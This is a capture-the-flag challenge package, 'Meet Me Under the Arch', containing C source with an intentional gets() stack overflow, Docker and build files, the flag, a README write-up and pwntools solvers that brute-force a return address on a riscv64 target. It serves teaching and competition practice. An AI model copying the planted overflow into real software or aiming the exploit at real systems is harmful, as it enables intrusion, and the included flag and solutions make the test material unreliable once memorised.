{
    ".gitignore": "*.aarch64\n*.riscv64\n",
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{just_a_touch_of_je_ne_sais_quoi}\"\n",
    "Dockerfile": "FROM ubuntu:focal\n\nRUN apt update && \\\n    DEBIAN_FRONTEND=noninteractive apt install -y socat qemu-system-misc qemu-user crossbuild-essential-riscv64\n\nEXPOSE 7238\n\nCOPY meet-me-under-the-arch.riscv64 /usr/bin/meet-me-under-the-arch\n\nWORKDIR /root\n\nENTRYPOINT [\"socat\", \"-d\", \"-d\", \"TCP-LISTEN:7238,reuseaddr,fork\", \"EXEC:qemu-riscv64 -L /usr/riscv64-linux-gnu /usr/bin/meet-me-under-the-arch,stderr\"]\n",
    "Makefile": "CC := clang-11\nCFLAGS := \nCONTAINER := meet-me-under-the-arch\n\nall: meet-me-under-the-arch\n\nclean: .PHONY\n\trm -f meet-me-under-the-arch.aarch64 meet-me-under-the-arch.riscv64\n\nmeet-me-under-the-arch: meet-me-under-the-arch.aarch64 meet-me-under-the-arch.riscv64\n\nmeet-me-under-the-arch.aarch64: meet-me-under-the-arch.c\n\t$(CC) -target aarch64-linux-gnu $(CFLAGS) $^ -o $@\n\nmeet-me-under-the-arch.riscv64: meet-me-under-the-arch.c\n\t$(CC) -target riscv64-linux-gnu -L /usr/riscv64-linux-gnu/lib/ $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile meet-me-under-the-arch.riscv64\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run --rm -ti -p 7238:7238 --name meet-me-under-the-arch meet-me-under-the-arch\n\n.PHONY:\n.SUFFIXES:\n",
    "meet-me-under-the-arch.c": "#include <stdio.h>\n\n#ifdef __aarch64__\nchar flag[39] = \"oops, no flag for you! how unfortunate\";\n#else\n#ifdef __riscv\nchar flag[39] = \"gigem{just_a_touch_of_je_ne_sais_quoi}\";\n#else\n#error Unexpected arch\n#endif\n#endif\n\nvoid vuln() {\n  char buf[53];\n  gets(buf);\n}\n\nvoid taunt() {\n  printf(\"Flag's here: %p\\nCome and get it!\\n\", flag);\n  fflush(stdout);\n  vuln();\n}\n\nvoid print_flag_debug() {\n  printf(\"Okay, so you really need the flag. Here it is: %s\\n\", flag);\n  fflush(stdout);\n}\n\nint main() {\n  taunt();\n  return 0;\n}\n",
    "problem.json": "{\n  \"name\": \"Meet Me Under the Arch\",\n  \"category\": \"Pwn\",\n  \"description\": \"The people who wrote this binary are simply mocking us with the simplicity of the vulnerability present in this binary, but we can't exploit the remote! It seems to be running riscv64 instead.\\n\\nCan you exploit the remote based off the vulnerability present in this binary? <a href='https://tamuctf.com/static-files/meet-me-under-the-arch.aarch64'>meet-me-under-the-arch</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername meet-me-under-the-arch -quiet</code>\",\n  \"score\" : 250,\n  \"hints\": [\"\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Addison Crump\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "README.md": "# meet-me-under-the-arch\n\n## Description\n\nThe people who wrote this binary are simply mocking us with the simplicity of the vulnerability present\nin this binary, but we can't exploit the remote! It seems to be running riscv64 instead.\n\nCan you exploit the remote based off the vulnerability present in this binary?\n\n```nc challenges.tamuctf.com 7238```\n\n## Solution\n\ntl;dr: reverse the binary into c, compile your own binary for riscv64 so you can get the general print_flag_debug location, and then brute force that area of the binary until your exploit works. \n\n### initial review\n\n#### main\n\n```c\nundefined8 main(void)\n\n{\n  taunt();\n  return 0;\n}\n```\n\n#### taunt\n\n```c\nvoid taunt(void)\n\n{\n  uint uVar1;\n  \n  printf(\"Flag\\'s here: %p\\nCome and get it!\\n\",flag);\n  uVar1 = fflush(stdout);\n  vuln((ulonglong)uVar1);\n  return;\n}\n```\n\n#### vuln\n\n```c\nvoid vuln(void)\n\n{\n  char acStack69 [53];\n  \n  gets(acStack69);\n  return;\n}\n```\n\n#### print_flag_debug\n\n```c\nulonglong print_flag_debug(void)\n\n{\n  uint uVar1;\n  \n  printf(\"Okay, so you really need the flag. Here it is: %s\\n\",flag);\n  uVar1 = fflush(stdout);\n  return (ulonglong)uVar1;\n}\n```\n\nThe flow of this exploit is pretty straightforward.  We have an unbounded buffer overflow via gets and a function that prints the flag when called.  If the server were running the aarch64 binary we were provided the challenge would basically be done.  Instead, we need to figure out the address of the function when compiled for a riscv64 target.  \n\n### creating a local riscv64 binary\n\nI opened up the provided aarch64 binary in Ghidra and pretty much copy pasted the function decompilations into another file with minor changes to make it compile.  \n\n```c\n#include <stdlib.h>\n#include <stdio.h>\nchar* flag = \"gigem{howdy!}\";\n\n\nvoid print_flag_debug() {  \n  printf(\"Okay, so you really need the flag. Here it is: %s\\n\",flag);\n  fflush(stdout);\n}\n\nvoid vuln(void) {\n  char acStack69 [53];  \n  gets(acStack69);\n}\n\n\nvoid taunt() {\n  printf(\"Flag\\'s here: %p\\nCome and get it!\\n\",flag);\n  fflush(0);\n  vuln();\n}\n\nint main() {\n\ttaunt();\n}\n```\nOnce you have the C code for it, you just need to compile it into riscv64 instructions.  The provided aarch64 binary used clang (which could be found via strings) and so I did also. If you don't already have it, you'll need to install the riscv64 gcc toolchain to compile to it.  \n\n`clang --target=riscv64-linux-gnu meet-me-under-the-arch.c  -o meet-me-under-the-arch.riscv64 -nopie -fno-stack-protector -v`\n\n\nThe address of the print_flag_debug function on my compiled copy is 0x10558.  To allow for some differences in the compilation we'll start a little bit below that and iterate up from there until we get the flag.  \n\n### exploiting the server\n\n\n```python\nfrom pwn import *\nimport re\nimport sys\nimport time\ncontext.terminal = ['termite','-e']\n\ne = ELF(\"./meet-me-under-the-arch.riscv64\")\n\nbase = 0x10500 # 0x58 below the address of print_flag_debug in my compiled copy\n\n\npayload = b\"B\" * 61\nindex = 0\n\nwhile True:\n\tp = remote(\"34.123.13.72\", 7238)\n\tprint(\"Trying addr: \", hex(base))\n\ttarget = int(re.search(\"^Flag's here: (.*?)$\",p.readline().decode(\"utf-8\") ).group(1),16)\n\tp.sendline(payload + p64(base, endian=e.endian))\n\ttime.sleep(.5) # this delay is important because otherwise receiving the flag is inconsistent\n\tp.recv(256)\n\n\ttry:\n\t\tif p.can_recv():\n\t\t\tmaybe_flag = p.recv(256).decode(\"utf-8\")\n\t\t\tmatch = re.search(\"gigem{.*?}\", maybe_flag)\n\t\t\tif match is not None:\n\t\t\t\tprint(match.group(0))\n\t\t\t\tsys.exit()\n\texcept EOFError:\n\t\tpass\n\tp.close()\n\tbase += 1\n```\n\n```text\n\u276f python solver.py SILENT=1\nTrying addr:  0x10558\nTrying addr:  0x10559\nTrying addr:  0x1055a\nTrying addr:  0x1055b\nTrying addr:  0x1055c\nTrying addr:  0x1055d\n...\nTrying addr:  0x1059c\nTrying addr:  0x1059d\nTrying addr:  0x1059e\ngigem{just_a_touch_of_je_ne_sais_quoi}\n```",
    "solution.py": "from pwn import *\nimport struct\n\ncontext.terminal = ['tilix', '-e']\n\nc = remote('localhost', 4444)\nc.recvline();\nc.recvline();\nc.sendline(b'a'*0x3d + struct.pack(\"<Q\", 0x0001059e))\nprint(c.recvline())\n",
    "category": "pwn"
}